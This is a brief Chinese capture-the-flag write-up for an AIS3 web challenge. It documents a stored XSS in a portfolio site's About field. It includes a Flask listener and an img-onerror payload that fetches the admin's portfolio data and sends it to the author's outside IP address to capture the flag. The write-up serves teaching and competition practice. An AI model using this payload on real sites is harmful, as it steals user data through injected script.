# E-Portfolio baby
## 題目

![image](https://user-images.githubusercontent.com/57281249/239947968-58cebf9a-2d90-4e46-962c-708821270e0e.png)

## 解題
網頁進來是登入介面
![image](https://user-images.githubusercontent.com/57281249/239949795-ccaa3dcf-f7dd-486e-9ceb-ef88c53b4639.png)

About 那邊可以放 html 看起來可以 XSS
![image](https://user-images.githubusercontent.com/57281249/239949939-80bef056-5b2f-411e-9dee-ac420c3487e7.png)

測一下
![image](https://user-images.githubusercontent.com/57281249/239950346-3fe6900c-5d62-4690-9550-4aaaa7115e5c.png)

看起來可以
![image](https://user-images.githubusercontent.com/57281249/239950395-1559651a-26a4-4397-8bf6-c4c143e47259.png)

用 flask 隨便寫個 server 聽 request
``` python
#!/usr/bin/env python3

from flask import Flask,request,redirect,Response


app = Flask(__name__)

@app.route('/',methods=['GET'])
def data():
    print(request.args)
    return "aaa"


if __name__ == "__main__":
    app.run(host="0.0.0.0",port=80)
```

payload
``` html
<h5>Hello!</h5>
I am a <span style="color: red;">new</span> user.

<img src=x onerror='fetch("/api/portfolio").then(res => res.json()).then(data => {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})'/>
```

送去給 admin
![image](https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png)

然後就收到 flag 了
![image](https://user-images.githubusercontent.com/57281249/239951318-cdb64a68-3280-4d77-89e7-068574d94b4f.png)

# Flag
`AIS3{<img src=x onerror='fetch(...}`